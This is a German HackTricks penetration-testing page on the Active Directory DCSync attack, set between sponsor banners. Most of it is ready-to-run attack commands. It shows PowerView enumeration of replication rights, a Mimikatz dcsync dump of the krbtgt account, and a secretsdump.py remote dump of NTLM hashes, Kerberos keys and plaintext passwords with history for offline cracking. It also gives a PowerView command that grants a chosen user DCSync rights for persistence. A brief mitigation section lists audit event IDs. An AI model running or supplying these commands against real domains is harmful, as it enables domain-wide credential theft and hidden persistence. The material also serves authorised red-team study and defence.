# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen und zu automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## DCSync

Die Berechtigung **DCSync** impliziert, dass diese Berechtigungen über die Domäne selbst verfügt werden: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.

**Wichtige Hinweise zu DCSync:**

* Der **DCSync-Angriff simuliert das Verhalten eines Domänencontrollers und fordert andere Domänencontroller auf, Informationen zu replizieren**, indem der Directory Replication Service Remote Protocol (MS-DRSR) verwendet wird. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann sie nicht ausgeschaltet oder deaktiviert werden.
* Standardmäßig verfügen nur die Gruppen **Domänen-Admins, Unternehmens-Admins, Administratoren und Domänencontroller** über die erforderlichen Berechtigungen.
* Wenn Kontokennwörter mit umkehrbarer Verschlüsselung gespeichert sind, besteht die Möglichkeit, in Mimikatz das Kennwort im Klartext zurückzugeben.

### Enumeration

Überprüfen Sie, wer diese Berechtigungen mit `powerview` hat:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Lokale Ausnutzung
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Remote ausnutzen
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiert 3 Dateien:

* eine mit den **NTLM-Hashes**
* eine mit den **Kerberos-Schlüsseln**
* eine mit Klartextpasswörtern aus dem NTDS für Konten, bei denen die [**umkehrbare Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Sie können Benutzer mit umkehrbarer Verschlüsselung erhalten mit

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistenz

Wenn Sie ein Domänenadministrator sind, können Sie einem Benutzer mit Hilfe von `powerview` diese Berechtigungen gewähren:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dann können Sie **überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden**, indem Sie nach ihnen im Ausgabebereich suchen (Sie sollten die Namen der Berechtigungen im Feld "ObjectType" sehen):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Abhilfe

* Sicherheitsereignis-ID 4662 (Überwachungsrichtlinie für Objekt muss aktiviert sein) - Es wurde eine Operation an einem Objekt durchgeführt
* Sicherheitsereignis-ID 5136 (Überwachungsrichtlinie für Objekt muss aktiviert sein) - Ein Verzeichnisdienstobjekt wurde geändert
* Sicherheitsereignis-ID 4670 (Überwachungsrichtlinie für Objekt muss aktiviert sein) - Berechtigungen für ein Objekt wurden geändert
* AD ACL Scanner - Erstellen und vergleichen von Berichten über ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referenzen

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos Workflows zu erstellen und zu **automatisieren**, unterstützt von den weltweit **fortschrittlichsten** Community-Tools.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
